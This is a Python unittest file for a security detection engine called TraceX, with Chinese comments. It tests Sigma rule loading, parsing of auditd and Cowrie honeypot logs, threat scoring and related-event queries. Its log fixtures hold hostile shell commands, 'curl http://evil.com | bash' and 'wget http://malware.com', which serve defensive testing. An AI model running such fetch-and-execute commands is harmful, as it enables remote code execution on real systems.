# d:/TraceX/my/tests/test_context_engine.py
# --------------------------------------------------------------------------------
# TraceX v5.2 部署前完整性自检脚本 (Strict Mode)
# --------------------------------------------------------------------------------

import unittest
import os
import sys
import logging
from datetime import datetime
from unittest.mock import MagicMock

# =================== 核心路径修复 (Critical Path Fix) ===================
# 1. 获取当前脚本所在目录 (d:/TraceX/my/tests)
current_test_dir = os.path.dirname(os.path.abspath(__file__))

# 2. 获取项目根目录 (d:/TraceX/my) -> 假设 tests 和 analyzer 同级
project_root = os.path.dirname(current_test_dir)

# 3. 【关键修改】将项目根目录加入 sys.path，而不是子目录
if project_root not in sys.path:
    sys.path.insert(0, project_root)

# 4. 定义规则目录的物理路径 (d:/TraceX/my/analyzer/attack_analyzer/rules)
rules_dir_path = os.path.join(project_root, 'analyzer', 'attack_analyzer', 'rules')

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    datefmt='%H:%M:%S'
)
logger = logging.getLogger("TraceX-Deploy-Check")

try:
    # 【关键修改】使用完整包路径导入，解决相对导入报错问题
    from analyzer.attack_analyzer.context_engine import ContextEngine
    from analyzer.attack_analyzer.attack_tagger import AttackAnalyzer
    from analyzer.attack_analyzer.field_mapper import FieldMapper
    from analyzer.attack_analyzer.rule_loader import RuleLoader
except ImportError as e:
    logger.critical(f"❌ 严重错误: 无法加载核心模块。\n当前搜索路径: {sys.path}\n错误详情: {e}")
    sys.exit(1)

# ------------------- 辅助：探针规则内容 -------------------
TEST_RULE_FILENAME = "deploy_check_marker_rule.yml"
TEST_RULE_CONTENT = """
title: Deployment Check Probe
id: deploy-check-001
status: test
description: A temporary rule to verify engine functionality during deployment
logsource:
    product: linux
    category: process_creation
detection:
    selection:
        Image|endswith: '/deploy_check_probe'
    condition: selection
level: critical
tags:
    - attack.execution
    - attack.t1059
"""

class TraceXDeploymentTests(unittest.TestCase):
    
    @classmethod
    def setUpClass(cls):
        print("\n" + "="*60)
        print("  TraceX v5.2 部署前核心功能自检 (Deployment Verification)")
        print("="*60)
        print(f"[*] 项目根目录: {project_root}")
        print(f"[*] 规则目录: {rules_dir_path}")
        
        cls.rules_dir = rules_dir_path
        
        if not os.path.exists(cls.rules_dir):
            logger.warning(f"⚠️ 规则目录不存在，尝试创建: {cls.rules_dir}")
            try:
                os.makedirs(cls.rules_dir, exist_ok=True)
            except Exception as e:
                logger.error(f"❌ 无法创建目录: {e}")
                raise
        
        cls.probe_rule_path = os.path.join(cls.rules_dir, TEST_RULE_FILENAME)
        try:
            with open(cls.probe_rule_path, 'w', encoding='utf-8') as f:
                f.write(TEST_RULE_CONTENT)
            logger.info(f"✅ 环境准备: 已在 {cls.rules_dir} 注入探针规则")
        except Exception as e:
            logger.error(f"❌ 写入规则失败: {e}")
            raise

    @classmethod
    def tearDownClass(cls):
        if os.path.exists(cls.probe_rule_path):
            try:
                os.remove(cls.probe_rule_path)
                logger.info("✅ 环境清理: 已移除探针规则")
            except:
                pass

    # =========================================================================
    # 第一部分：基础组件真实性验证
    # =========================================================================

    def test_01_real_rule_loading(self):
        """[基础] 验证 RuleLoader 能否读取真实目录下的 YAML 文件"""
        loader = RuleLoader(self.rules_dir)
        count = loader.load_all()
        logger.info(f"🔍 规则加载: 扫描到 {count} 条规则")
        self.assertGreater(count, 0, "❌ 失败: 规则目录为空或无法解析！")
        probe_loaded = any(r.title == "Deployment Check Probe" for r in loader.rules)
        self.assertTrue(probe_loaded, "❌ 失败: 引擎未能识别刚刚写入的探针规则")

    def test_02_field_mapper_robustness(self):
        """[基础] 验证 FieldMapper 对复杂 Auditd/Cowrie 日志的清洗能力"""
        mapper = FieldMapper()
        # 1. 模拟 Auditd 脏数据
        raw_auditd = {
            "event": {"dataset": "auditd"},
            "raw": {"type": "EXECVE", "data": 'argc=4 a0="bash" a1="-c" a2="curl http://evil.com | bash"'},
            "process": {"executable": "/usr/bin/bash"}
        }
        res_auditd = mapper.map_event(raw_auditd, {'product': 'linux'})
        self.assertIn("curl http://evil.com", res_auditd.get("CommandLine", ""), "❌ Auditd 解析失败")
        
        # 2. 模拟 Cowrie 输入 (v5.2 新增)
        raw_cowrie = {
            "event": {"dataset": "cowrie"},
            "input": "wget http://malware.com",
            "process": {"command_line": "wget http://malware.com"}
        }
        res_cowrie = mapper.map_event(raw_cowrie, {'product': 'linux', 'category': 'process_creation'})
        self.assertEqual(res_cowrie.get("CommandLine"), "wget http://malware.com", "❌ Cowrie 字段映射失败")
        
        logger.info("✅ 字段映射: Auditd 和 Cowrie 解析验证通过")

    # =========================================================================
    # 第二部分：v5.2 核心逻辑验证 (Context Engine)
    # =========================================================================

    def test_03_context_scoring_logic(self):
        """[核心] 验证 ContextEngine v5.2 的评分逻辑 (Confidence Based)"""
        mock_es_wrapper = MagicMock()
        mock_es_wrapper.es = MagicMock()
        engine = ContextEngine(mock_es_wrapper)
        
        # 场景 A: 基础 Sigma 命中 (Confidence 0.8 -> Score 80)
        event_sigma = {
            "detection": {"confidence": 0.8, "rules": ["Suspicious Command"]},
            "threat": {"technique": {"id": "T1059"}}
        }
        score_a = engine.evaluate_threat(event_sigma)
        self.assertEqual(score_a['score'], 80, f"❌ 失败: 基础 Confidence 转换错误 (期望80, 实际{score_a['score']})")

        # 场景 B: Cowrie Critical 特例 (Confidence 1.0 + Cowrie -> Score 100)
        event_cowrie = {
            "event": {"dataset": "cowrie"},
            "detection": {"confidence": 1.0},
            "threat": {"technique": {"id": "T1105"}}
        }
        score_b = engine.evaluate_threat(event_cowrie)
        self.assertEqual(score_b['score'], 100, f"❌ 失败: Cowrie Critical 特例未生效")
        self.assertIn("Critical Honeypot Alert", str(score_b['reasons']), "❌ 失败: 缺少 Cowrie 关键理由")

        # 场景 C: 启发式兜底 (Confidence 0, 但命中 WebShell)
        event_heuristic = {
            "detection": {"confidence": 0.0},
            "file": {"path": "/var/www/html/shell.php", "extension": "php"},
            "event": {"action": "write"}
        }
        score_c = engine.evaluate_threat(event_heuristic)
        self.assertEqual(score_c['score'], 90, f"❌ 失败: 启发式规则兜底未生效 (期望90, 实际{score_c['score']})")

        logger.info("✅ 威胁评分: Confidence转换、Cowrie特例、启发式兜底验证通过")

    def test_04_context_query_v5_2_compliance(self):
        """[核心] 验证 find_related_events 符合组员2的索引结构要求"""
        mock_es = MagicMock()
        mock_es.search.return_value = {"hits": {"hits": []}}
        wrapper = MagicMock(); wrapper.es = mock_es
        engine = ContextEngine(wrapper)
        
        anchor = {
            "@timestamp": "2026-01-13T10:00:00.000Z",
            "host": {"name": "iZ2ze082hzl5s9xfijazalZ"}, # 真实 host.name 示例
            "source": {"ip": "59.64.129.102"}
        }
        
        engine.find_related_events(anchor)
        
        # 1. 验证索引名称 (包含 honeypot-logs 和 network-flows)
        call_args = mock_es.search.call_args
        target_indices = call_args[1]['index']
        self.assertIn("network-flows*", target_indices)
        self.assertIn("honeypot-logs*", target_indices)
        
        # 2. 验证 Host 强关联
        query_body = call_args[1]['body']
        must_queries = query_body['query']['bool']['must']
        
        # [Fix] 修正提取逻辑：'host.name' 是在 term 字典内部的 key
        host_term = next(
            (q['term']['host.name'] for q in must_queries 
             if 'term' in q and 'host.name' in q['term']),  # <--- 修改了这里的判断逻辑
            None
        )
        self.assertEqual(host_term, "iZ2ze082hzl5s9xfijazalZ", "❌ 失败: 缺少 host.name 强关联查询")

        logger.info("✅ 溯源查询: 索引范围与 Host 关联逻辑验证通过")
    # =========================================================================
    # 第三部分：全链路集成验证 (Upstream Passthrough)
    # =========================================================================

    def test_05_upstream_passthrough(self):
        """[集成] 验证 AttackAnalyzer 对上游威胁 (Member 2) 的自动透传"""
        analyzer = AttackAnalyzer(self.rules_dir)
        analyzer.initialize()
        
        # 模拟组员2 发来的 DNS Tunneling 告警 (无本地规则，纯上游)
        upstream_event = {
            "event": {"dataset": "zeek.dns", "severity": 7, "id": "test-dns-tunnel"},
            "threat": {
                "technique": {"id": "T1071.004", "name": "DNS Tunneling"}
            },
            "@timestamp": datetime.now().isoformat(),
            "message": "DNS Tunneling Detected"
        }
        
        # 1. 检测
        result = analyzer.analyze_event(upstream_event)
        
        # 2. 验证
        self.assertTrue(result['detected'], "❌ 失败: 上游威胁未被 AttackAnalyzer 捕获")
        techniques = result['techniques']
        self.assertTrue(any(t['technique']['id'] == "T1071.004" for t in techniques), 
                        "❌ 失败: 上游 Technique ID 未正确透传")
        
        # 3. 验证是否生成了虚拟规则名
        matched_rules = result['matched_rules']
        self.assertTrue(any("Upstream Detection" in r for r in matched_rules), 
                        "❌ 失败: 未生成虚拟规则名称")
        
        logger.info(f"✅ 全链路测试: 上游威胁 (DNS Tunneling) 透传成功")

if __name__ == '__main__':
    try:
        unittest.main(verbosity=2)
    except Exception as e:
        logger.critical(f"❌ 测试异常: {e}")
        sys.exit(1)